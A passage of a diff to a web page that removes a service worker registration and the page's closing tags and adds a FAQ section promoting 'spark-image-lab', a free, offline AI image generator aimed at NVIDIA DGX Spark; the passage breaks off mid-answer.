-    navigator.serviceWorker.register("sw.js").catch(() => {});
-  }
-</script>
-</body>
-</html>
+        <h2>❓ Frequently Asked Questions</h2>
+        <div class="faq-item">
+            <h3>Is spark-image-lab really free?</h3>
+            <p>Yes! spark-image-lab is completely free to use and open-source. You can download, use, and even modify it as you wish.</p>
+        </div>
+        <div class="faq-item">
+            <h3>Do I need an internet connection?</h3>
+            <p>No. Once downloaded and installed, spark-image-lab works entirely on your local machine. You don't need an internet connection to generate or edit images.</p>
+        </div>
+        <div class="faq-item">
+            <h3>Can I use this without an NVIDIA DGX Spark?</h3>
+            <p>While spark-image-lab is optimized for the DGX Spark, it can also run on other NVIDIA GPUs with sufficient VRAM. However, for the best experience, we recommend using a DGX Spark.</p>
+        </div>
+        <div class="faq-item">
+            <h3>What kind of images can I create?</h3>
+            <p>The possibilities are endless! You can create realistic photos, artistic illustrations, logos, product images, backgrounds, and much more. The AI follows your text descriptions to create unique images.</p>
+        </div>
+        <div class="faq-item">
+            <h3>Is my data safe?</h3>
+            <p>Absolutely.
